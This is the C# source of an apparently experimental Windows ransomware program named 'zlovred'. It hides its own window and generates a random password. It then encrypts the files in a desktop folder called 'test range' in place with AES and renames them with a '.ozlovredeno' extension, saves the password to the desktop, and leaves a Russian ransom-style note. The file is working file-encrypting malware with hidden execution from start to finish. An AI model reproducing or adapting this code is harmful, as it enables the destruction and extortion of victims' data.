using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace zlovred
{
    public partial class Form1 : Form
    {
        string userDir = "C:\\Users\\";
        string userName = Environment.UserName;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            
            startAction();
        }

        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }
        public string CreatePassword(int lenght)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < lenght--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        public void SavePassword(string pass)
        {
            string passPath = userDir + userName + "\\Desktop\\passZlovred.txt";
            System.IO.File.WriteAllText(passPath, pass);
        }

        public void EncryptFile(string file, string password)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".ozlovredeno");
        }

        public void encryptDirectory(string encrPath, string password)
        {
            var validExtensions = ".txt";
            string[] files = Directory.GetFiles(encrPath);
            string[] childDirectories = Directory.GetDirectories(encrPath);
            for (int i = 0; i<files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i], password);
                }
            }
            for (int i = 0; i<childDirectories.Length; i++)
            {
                encryptDirectory(childDirectories[i], password);
            }
        }

        public void startAction()
        {
            string password = CreatePassword(15);
            string path = "\\Desktop\\подопытный полигон\\";
            string startPath = userDir + userName + path;

            SavePassword(password);
            encryptDirectory(startPath, password);
            messageCreator();
            password = null;
            System.Windows.Forms.Application.Exit();
        }
        
        public void messageCreator()
        {
            string path = "\\Desktop\\подопытный полигон\\READ_ME.txt";
            string fullPath = userDir + userName + path;
            string[] lines = { "Пароль на рабочем столе. Приятного расшифровывания :)" };
            System.IO.File.WriteAllLines(fullPath, lines);
        }
    }
}